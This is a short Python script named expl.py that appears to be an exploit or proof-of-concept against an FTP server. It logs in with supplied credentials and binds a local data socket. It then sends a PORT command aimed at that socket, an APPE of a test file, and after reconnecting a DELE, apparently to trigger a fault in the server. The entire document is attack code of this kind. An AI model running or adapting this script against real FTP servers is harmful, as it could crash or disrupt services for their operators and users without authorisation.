#!/usr/bin/python3
import socket
import sys

def usage():
    print("Usage: ./expl.py <serv_ip> <Username> <password>\n")
    print("Example: ./expl.py 192.168.48.183 anonymous anonymous\n")

if len(sys.argv) != 4:
    usage()
    sys.exit(1)

hostname = sys.argv[1]
username = sys.argv[2]
passwd = sys.argv[3]
test_string = "a"

# Create control socket
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock_data = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    sock.connect((hostname, 21))
except Exception as e:
    print(f"Connection error: {e}")
    sys.exit(1)

# Receive banner
r = sock.recv(1024).decode('utf-8')
print(f"[+] {r.strip()}")

# Send USER command
sock.send(f"user {username}\r\n".encode('utf-8'))
print(f"[-] user {username}")
r = sock.recv(1024).decode('utf-8')
print(f"[+] {r.strip()}")

# Send PASS command
sock.send(f"pass {passwd}\r\n".encode('utf-8'))
print(f"[-] pass {passwd}")
r = sock.recv(1024).decode('utf-8')
print(f"[+] {r.strip()}")

# Bind data socket
try:
    sock_data.bind(('127.0.0.1', 31339))
    sock_data.listen(1)
except Exception as e:
    print(f"Data socket error: {e}")
    sock.close()
    sys.exit(1)

# Send PORT command
sock.send("PORT 127,0,0,1,122,107\r\n".encode('utf-8'))
print("[-] PORT 127,0,0,1,122,107")
r = sock.recv(1024).decode('utf-8')
print(f"[+] {r.strip()}")

# Send APPE command
sock.send(f"APPE {test_string}\r\n".encode('utf-8'))
print(f"[-] APPE {test_string}")
r = sock.recv(1024).decode('utf-8')
print(f"[+] {r.strip()}")

# Close sockets
sock.close()
sock_data.close()

# Reconnect to delete the file
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
    sock.connect((hostname, 21))
except Exception as e:
    print(f"Connection error: {e}")
    sys.exit(1)

# Receive banner
r = sock.recv(1024).decode('utf-8')
print(f"[+] {r.strip()}")

# Send USER command
sock.send(f"user {username}\r\n".encode('utf-8'))
print(f"[-] user {username}")
r = sock.recv(1024).decode('utf-8')
print(f"[+] {r.strip()}")

# Send PASS command
sock.send(f"pass {passwd}\r\n".encode('utf-8'))
print(f"[-] pass {passwd}")
r = sock.recv(1024).decode('utf-8')
print(f"[+] {r.strip()}")

# Send DELE command
sock.send(f"DELE {test_string}\r\n".encode('utf-8'))
print(f"[-] DELE {test_string}")
r = sock.recv(1024).decode('utf-8')
print(f"[+] {r.strip()}")

# Close socket
sock.close()